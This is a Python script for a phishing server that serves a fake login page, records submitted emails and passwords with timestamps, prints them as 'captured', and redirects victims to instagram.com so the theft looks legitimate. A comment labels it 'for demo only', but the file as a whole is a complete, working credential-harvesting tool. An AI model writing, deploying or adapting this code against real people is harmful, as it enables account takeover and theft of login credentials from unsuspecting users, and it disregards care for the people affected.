from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import datetime

# Store captured credentials (for demo only)
captured_data = []

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve the fake login page"""
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            with open("phishing_page.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Page not found")

    def do_POST(self):
        """Capture login credentials"""
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse the form data
            parsed_data = urllib.parse.parse_qs(post_data)
            
            email = parsed_data.get('email', [''])[0]
            password = parsed_data.get('password', [''])[0]
            
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            print("\n" + "="*60)
            print("🔴 PHISHING CREDENTIALS CAPTURED!")
            print(f"Time     : {timestamp}")
            print(f"Email    : {email}")
            print(f"Password : {password}")
            print("="*60 + "\n")
            
            captured_data.append({
                "time": timestamp,
                "email": email,
                "password": password
            })
            
            # Redirect to real site (to look legitimate)
            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com/')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def run_server():
    print("🚀 Starting Fake Phishing Server...")
    print("📍 Server running at http://0.0.0.0:8080")
    print("⚠️  Press Ctrl+C to stop\n")
    server = HTTPServer(('0.0.0.0', 8080), PhishingHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServer stopped.")
        if captured_data:
            print(f"\nTotal credentials captured: {len(captured_data)}")

if __name__ == "__main__":
    run_server()
